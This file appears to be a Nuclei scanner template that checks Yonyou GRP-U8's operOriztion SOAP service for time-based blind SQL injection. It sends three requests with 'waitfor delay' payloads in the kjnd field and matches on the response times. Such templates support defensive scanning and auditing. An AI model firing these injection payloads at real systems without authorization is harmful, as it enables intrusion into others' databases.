用友U8-GRP-operoriztion-sql注入.yaml

id: yongyou-grp-u8-operOriztion-sql

info:
  name: yongyou-grp-u8-operOriztion-sql
  author: yongyou-grp-u8-operOriztion-sql
  severity: critical


http:
  - raw:
      - |
        POST /services/operOriztion HTTP/1.1
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
        Connection: close
        SOAPAction: 
        Content-Type: text/xml;charset=UTF-8
        Host: {{Hostname}}

        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
          <soapenv:Header/>
          <soapenv:Body>
              <wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                <kjnd xsi:type="xsd:string">gero et' waitfor delay'0:0:3'--</kjnd>
              </wsdd:getGsbmfaByKjnd>
          </soapenv:Body>
        </soapenv:Envelope>

      - |
        @timeout: 15s
        POST /services/operOriztion HTTP/1.1
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
        Connection: close
        SOAPAction: 
        Content-Type: text/xml;charset=UTF-8
        Host: {{Hostname}}

        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
          <soapenv:Header/>
          <soapenv:Body>
              <wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                <kjnd xsi:type="xsd:string">gero et' waitfor delay'0:0:6'--</kjnd>
              </wsdd:getGsbmfaByKjnd>
          </soapenv:Body>
        </soapenv:Envelope>

      - |
        @timeout: 15s
        POST /services/operOriztion HTTP/1.1
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
        Cookie: JSESSIONID=92AB9DDBFCA468545DA5BF25465FEAAB
        Connection: close
        SOAPAction: 
        Content-Type: text/xml;charset=UTF-8
        Host: {{Hostname}}

        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
          <soapenv:Header/>
          <soapenv:Body>
              <wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                <kjnd xsi:type="xsd:string">gero et' waitfor delay'0:0:9'--</kjnd>
              </wsdd:getGsbmfaByKjnd>
          </soapenv:Body>
        </soapenv:Envelope>
    

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"